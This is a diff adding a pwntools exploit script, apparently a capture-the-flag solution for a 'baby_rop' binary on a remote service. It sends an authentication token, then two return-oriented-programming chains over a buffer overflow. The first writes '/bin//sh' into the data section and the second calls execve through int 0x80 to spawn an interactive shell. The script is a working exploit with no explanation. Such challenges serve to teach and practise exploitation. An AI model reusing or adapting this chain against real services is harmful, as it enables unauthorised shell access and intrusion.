@@ -1,0 +1,51 @@
+from pwn import *
+from struct import pack
+auth='<deleted>'
+main_addr=0x08048E24
+
+sh=remote("10.214.10.18",11863)
+sh.recvrepeat(timeout = 1)
+sh.sendline(auth)
+
+
+#sh=process('./baby_rop')
+sh.recvrepeat(timeout = 1)
+
+
+p = ''
+p += pack('<I', 0x0806e82a) # pop edx ; ret
+p += pack('<I', 0x080ea060) # @ .data
+p += pack('<I', 0x080bae06) # pop eax ; ret
+p += '/bin'
+p += pack('<I', 0x0809a15d) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x0806e82a) # pop edx ; ret
+p += pack('<I', 0x080ea064) # @ .data + 4
+p += pack('<I', 0x080bae06) # pop eax ; ret
+p += '//sh'
+p += pack('<I', 0x0809a15d) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x0806e82a) # pop edx ; ret
+p += pack('<I', 0x080ea068) # @ .data + 8
+p += pack('<I', 0x08054250) # xor eax, eax ; ret
+p += pack('<I', 0x0809a15d) # mov dword ptr [edx], eax ; ret
+p += p32(main_addr)
+payload="A"*32+p
+sh.sendline(payload)
+sh.recvrepeat(timeout = 1)
+
+p = ''
+p += pack('<I', 0x080481c9) # pop ebx ; ret
+p += pack('<I', 0x080ea060) # @ .data
+p += pack('<I', 0x0806e851) # pop ecx ; pop ebx ; ret
+p += pack('<I', 0x080ea068) # @ .data + 8
+p += pack('<I', 0x080ea060) # padding without overwrite ebx
+p += pack('<I', 0x0806e82a) # pop edx ; ret
+p += pack('<I', 0x080ea068) # @ .data + 8
+p += pack('<I', 0x0808f720) # mov eax, 7 ; ret
+p += pack('<I', 0x0808F6A0) # add eax, 3 ; ret
+p += pack('<I', 0x0807b27f) # inc eax ; ret
+p += pack('<I', 0x080493e1) # int 0x80
+payload="A"*28+p
+sh.sendline(payload)
+sh.recvrepeat(timeout = 1)
+
+sh.interactive()
